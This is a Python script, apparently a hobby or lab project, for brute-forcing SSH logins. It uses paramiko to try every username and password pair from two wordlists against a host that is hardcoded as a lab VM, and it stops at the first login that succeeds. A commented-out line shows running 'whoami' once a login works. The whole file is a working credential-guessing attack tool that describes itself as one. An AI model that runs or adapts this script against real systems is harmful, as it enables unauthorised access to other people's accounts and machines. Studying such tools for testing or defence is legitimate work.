import argparse
import paramiko
import os
from termcolor import colored


IP_ADDRESS = None
PORT = None


def ssh_bruteforce(path_userlist, path_passlist):
    if not os.path.exists(path_userlist) or not os.path.exists(path_passlist):
        print('No such USERLIST/PASSLIST exists')
        quit()

    with open(path_userlist, 'r') as u_list, open(path_passlist, 'r') as p_list:
        for u_line in u_list:
            for p_line in p_list:
                u_var = str(u_line)
                p_var = str(p_line)
                print("====> Trying with: -> " + u_var.strip() + " Trying  with: -> " + p_var.strip(), end=' ')
                ssh_connection(u_var.strip(), p_var.strip())
            p_list.seek(0)


# Function to try and connect to the ssh client
def ssh_connection(username, password):
    global IP_ADDRESS, PORT

    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh_client.connect(hostname=IP_ADDRESS, username=username, password=password, port=PORT)

        # To execute Commands:
        # stdin, stdout, stderr = ssh_client.exec_command('whoami')
        # print(stdout.readlines())

    except paramiko.ssh_exception.AuthenticationException as raised_exception:
        print(colored("[FAILED]", "red"))
        if ssh_client:
            ssh_client.close()

    else:
        print(colored("[SUCCESS]", "green"))
        quit()  # Found the correct ID Password


def parse_arguments():
    # To take the IP and PORT as inputs
    msg = "This script is used to carry out Brute Force Attack on SSH Clients"
    parser = argparse.ArgumentParser(description=msg)

    parser.add_argument("-u", metavar="USER", help="ip address")
    parser.add_argument("-p", metavar="PORT", help="port value (default 22)", default=22, type=int)
    parser.add_argument("-uL", metavar="USERNAME LIST", help="path to file containing usernames")
    parser.add_argument("-uP", metavar="PASSWORD LIST", help="path to file containing passwords")

    return parser.parse_args()


def main():
    args = parse_arguments()  # Contains the command line arguments
    password_list = args.uP
    username_list = args.uL
    ip_address = args.u
    port = args.p

    global IP_ADDRESS, PORT
    IP_ADDRESS = "192.168.1.2"  # Value set to test on Parrot VM Babayaga
    PORT = 22

    # call to function which will connect with the ssh client
    # currently passing garbage value, to be changed later
    ssh_bruteforce(username_list.strip(), password_list.strip())


if __name__ == "__main__":
    main()
